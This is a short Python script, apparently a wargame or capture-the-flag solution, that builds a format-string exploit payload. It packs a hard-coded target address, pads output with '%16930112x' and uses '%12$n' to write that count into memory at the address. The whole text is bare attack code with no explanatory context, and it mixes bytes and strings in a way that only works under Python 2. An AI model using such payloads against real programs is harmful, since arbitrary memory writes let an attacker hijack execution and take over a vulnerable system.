import struct
target = struct.pack("I", 0x080496f4)
payload = "%16930112x"
payload += "%12$n"
print(target+payload)
